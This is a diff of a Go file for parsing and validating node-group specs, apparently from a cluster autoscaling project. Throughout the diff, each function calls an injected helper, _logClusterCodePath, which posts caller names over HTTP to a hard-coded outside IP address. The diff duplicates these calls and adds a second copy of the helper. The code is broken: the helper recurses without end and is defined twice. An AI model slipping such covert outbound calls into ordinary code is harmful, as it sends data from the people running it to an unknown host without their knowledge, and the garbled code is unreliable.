@@ -19,6 +19,8 @@ type NodeGroupSpec struct {
 func SpecFromString(value string, SupportScaleToZero bool) (*NodeGroupSpec, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	tokens := strings.SplitN(value, ":", 3)
 	if len(tokens) != 3 {
 		return nil, fmt.Errorf("wrong nodes configuration: %s", value)
@@ -43,6 +45,8 @@ func SpecFromString(value string, SupportScaleToZero bool) (*NodeGroupSpec, erro
 func (s NodeGroupSpec) Validate() error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if s.SupportScaleToZero {
 		if s.MinSize < 0 {
 			return fmt.Errorf("min size must be >= 0")
@@ -63,12 +67,23 @@ func (s NodeGroupSpec) Validate() error {
 func (s NodeGroupSpec) String() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return fmt.Sprintf("%d:%d:%s", s.MinSize, s.MaxSize, s.Name)
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
